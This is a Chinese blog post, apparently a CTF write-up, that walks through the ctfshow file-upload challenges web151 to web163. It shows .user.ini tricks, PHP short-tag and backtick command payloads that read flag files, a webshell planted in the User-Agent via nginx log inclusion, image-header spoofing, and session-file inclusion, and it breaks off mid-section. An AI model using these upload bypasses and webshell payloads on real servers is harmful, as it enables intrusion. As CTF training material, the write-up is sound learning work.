@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="web151 (前端限制) 知识点：修改前端限制  上传时，bp收不到，前端是限制了 修改为php，上传一句话，蚁剑连接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web入门(文件上传)">
+<meta property="og:url" content="http://example.com/2021/02/07/ctfshow%20web%E5%85%A5%E9%97%A8(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)/index.html">
+<meta property="og:site_name" content="程勇胜的博客">
+<meta property="og:description" content="web151 (前端限制) 知识点：修改前端限制  上传时，bp收不到，前端是限制了 修改为php，上传一句话，蚁剑连接">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144149666.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144219308.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144408993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144747930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144807765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144850649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207144916823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207145135137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207145358369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207145709167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207150105956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207150618230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153629238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153637241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153813974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153829440.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153854595.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207153916790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154127825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154149870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154251832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154429285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154715910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207154757101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207155332356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207155402568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207155418493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207155842122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160100574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160156995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160411769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021020716050553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160545769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160602178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160627232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210207160717602.png#pic_center">
+<meta property="article:published_time" content="2021-02-07T08:16:36.342Z">
+<meta property="article:modified_time" content="2021-03-06T11:11:47.595Z">
+<meta property="article:author" content="程勇胜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210207144149666.png#pic_center">
+
+<link rel="canonical" href="http://example.com/2021/02/07/ctfshow%20web%E5%85%A5%E9%97%A8(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow web入门(文件上传) | 程勇胜的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">程勇胜的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">29</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/07/ctfshow%20web%E5%85%A5%E9%97%A8(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="程勇胜">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="程勇胜的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow web入门(文件上传)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-07 16:16:36" itemprop="dateCreated datePublished" datetime="2021-02-07T16:16:36+08:00">2021-02-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-06 19:11:47" itemprop="dateModified" datetime="2021-03-06T19:11:47+08:00">2021-03-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="web151-前端限制"><a href="#web151-前端限制" class="headerlink" title="web151 (前端限制)"></a>web151 (前端限制)</h2><ul>
+<li>知识点：修改前端限制</li>
+</ul>
+<p>上传时，bp收不到，前端是限制了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207144149666.png#pic_center"><br>修改为php，上传一句话，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20210207144219308.png#pic_center"></p>
+<a id="more"></a>
+<hr>
+<h2 id="web152-后端限制"><a href="#web152-后端限制" class="headerlink" title="web152(后端限制)"></a>web152(后端限制)</h2><ul>
+<li>知识点：绕过后端对文件类型限制</li>
+</ul>
+<p>后端限制为图片，传入图片马，bp修改后缀，<br>蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20210207144408993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web153-user-ini配置文件绕过"><a href="#web153-user-ini配置文件绕过" class="headerlink" title="web153(.user.ini配置文件绕过)"></a>web153(.user.ini配置文件绕过)</h2><ul>
+<li>知识点：<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/">.user.ini</a></li>
+</ul>
+<p>发现很容易上传如php5,phtml等类型文件,但是不解析.通过插件识别为nginx服务器,尝试上传.user.ini,发现上传成功</p>
+<p>upload下有index.php所以.user.ini可以使用</p>
+<p>上传.user.ini时修改后缀，指向1.png图片马</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207144747930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>正常上传图片马</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207144807765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>访问/upload/index.php会直接在文件头部 指向（类似包含1.png）1.png</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207144850649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>蚁剑连接http://…/upload/index.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207144916823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web154-限制字符"><a href="#web154-限制字符" class="headerlink" title="web154(限制字符)"></a>web154(限制字符)</h2><ul>
+<li>知识点：绕过限制的字符</li>
+</ul>
+<p>与web153一样，但是上传图片马的时候出现错误，试着修改其中的字符，将php改大写即可</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207145135137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web155-短标签绕过"><a href="#web155-短标签绕过" class="headerlink" title="web155(短标签绕过)"></a>web155(短标签绕过)</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dongguol/p/5910617.html">短标签</a></li>
+</ul>
+<p>测试过滤了php<br><img src="https://img-blog.csdnimg.cn/20210207145358369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>所以只能用短标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;123&#39;;?&gt; &#x2F;&#x2F;short_open_tags&#x3D;on</span><br><span class="line"></span><br><span class="line">&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt; &#x2F;&#x2F;无限制</span><br><span class="line"></span><br><span class="line">&lt;% echo &#39;123&#39;;%&gt; &#x2F;&#x2F;asp_tags&#x3D;on  php_version &lt; 7</span><br><span class="line"></span><br><span class="line"> &lt;script language&#x3D;&quot;php&quot;&gt;echo &#39;123&#39;; &lt;&#x2F;script&gt; &#x2F;&#x2F;php_vsesion &lt; 7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210207145709167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web156-过滤"><a href="#web156-过滤" class="headerlink" title="web156(过滤)"></a>web156(过滤)</h2><p>过滤了 [ ]</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207150105956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><code>&#123; &#125;</code> 可以替代 <code>[ ]</code></p>
+<hr>
+<h2 id="web157-159-过滤"><a href="#web157-159-过滤" class="headerlink" title="web157-159(过滤)"></a>web157-159(过滤)</h2><p>过滤了<code>&#123;&#125;</code>和 <code>;</code>，那就直接输出flag算了</p>
+<blockquote>
+<p><code> ``</code>  和<code>$()</code> 两种命令的功能是相同的，在执行一条命令时，会将``或者$()中的语句当做命令执行一边，再把结果加入到原命令中重新执行。</p>
+</blockquote>
+<p>../返回上一层   *全部<br><?=`cat ../flag*`?><br><?=`tac ../f*`?><br><?=`nl ../flag*`?></p>
+<p>查看源码得flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207150618230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web160-日志包含"><a href="#web160-日志包含" class="headerlink" title="web160(日志包含)"></a>web160(日志包含)</h2><ul>
+<li>日志文件绕过</li>
+</ul>
+<p>过滤了括号 反引号还有一些关键字</p>
+<p>先上传.user.ini指向图片, 再上传图片指向日志文件，将一句话写入UA<br>内容<code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> (log被过滤)<br>蚁剑连接index.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207153629238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210207153637241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web161-检查十六进制文件头"><a href="#web161-检查十六进制文件头" class="headerlink" title="web161(检查十六进制文件头)"></a>web161(检查十六进制文件头)</h2><ul>
+<li>知识点：getimagesize()</li>
+</ul>
+<p>这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207153753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>限制了头文件有以下方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207153813974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>法一：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207153829440.png#pic_center"><br>法二：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207153854595.png#pic_center"></p>
+<p>法三：<br>添加png头部信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47 0D 0A 1A 0A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210207153916790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传.user.ini同样添加png头</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207154127825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传2.png日志包含</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207154149870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h2 id="web162-163-包含session文件"><a href="#web162-163-包含session文件" class="headerlink" title="web162-163(包含session文件)"></a>web162-163(包含session文件)</h2><ul>
+<li>知识点：session</li>
+</ul>
+<p>省去上传png文件(带有include..sess_cys)步骤<br>上传 .user.ini 时直接包含sess_cys</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207154251832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传1.txt 并添加恶意代码 添加cookie<br>表单攻击+时间竞争</p>
+<p><img src="https://img-blog.csdnimg.cn/20210207154402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>不断发送<br>此时我们访问/upload/index.php 抓包并爆破请求</p>
